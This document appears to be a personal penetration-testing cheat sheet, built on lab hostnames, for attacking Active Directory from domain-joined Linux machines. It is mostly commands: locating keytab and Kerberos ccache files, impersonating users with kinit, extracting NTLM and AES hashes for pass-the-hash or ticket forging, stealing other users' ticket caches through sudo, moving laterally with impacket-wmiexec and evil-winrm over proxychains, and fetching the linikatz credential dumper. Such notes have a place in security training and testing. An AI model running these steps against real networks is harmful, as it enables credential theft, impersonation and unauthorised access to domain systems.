 # Atk AD from linux tips

## realm - check if linux machine is domain-joined
```
realm list

# Kerberos member ?
# Domain name ?
```

## PS - Check if Linux Machine is Domain Joined
```
ps -ef | grep -i "winbind\|sssd"
```

## Find to Search for Files with Keytab in the Name
```
find / -name *keytab* -ls 2>/dev/null
```

## Identifying Keytab Files in Cronjobs
```
crontab -l
# if kinit, kerberos is used 
# kinit allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache</mark> (ccache file).
# use `kinit` to import a `keytab` into our session and act as the user
```

## Find ccache files
```
# Find ccache files
env | grep -i krb5

ls -la /tmp #kbrb5cc_???
```

## Abuse keytab files
```
# Abuse keytab files > Impersonate user using kinit

## List keytab file info
klist -k -t

## impersonate a user with a keytab
kinit <USER>@<DOMAIN> -k -t /.../<USER>.keytab
klist # confirm import

## connect to share
smbclient //dc01/<USER> -k -c ls

# Extract secrets from keytab
python3 /opt/keytabextract.py /../<USER>.keytab
## Use NTLM hash for PtH, AES256 hash to forge tickets in rubeuse/crack to get plaintext passwd
```

## Abuse keytab ccache
```
# Need read priv on the ccache file
sudo -l
sudo su

# look for ccache files, note the file owner of krb5cc_*
ls -la /tmp

# Check Group membership of file owner
id <USER(>@<Domain>)

# Import ccache file in current session
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=<FILE TO PATH> # Check date validity of ccache file
klist
```

## Abuse keyberos from a linux host using a pivot machine
```
# Set env var
export KRB5CCNAME=<FILE TO PATH>

# Use the kerberos ticket
# -no-pass for no password prompt
# DC01 = KDC
proxychains impacket-wmiexec dc01 -k
```

## evil-winrm - use kerberos auth
```
# install krb5-user package
# need to install the Kerberos package used for network authentication

# update conf for domain
$ cat /etc/krb5.conf
[libdefaults]
        default_realm = <DOMAIN>

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.>DOMAIN>
    }

<SNIP>

# Connect using a pivot
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## impacket ticket convertor - ccache <> kirbi
```
# ccache2kirbi
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

## linikatz - exploit creds on linux if integration with AD
```
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```
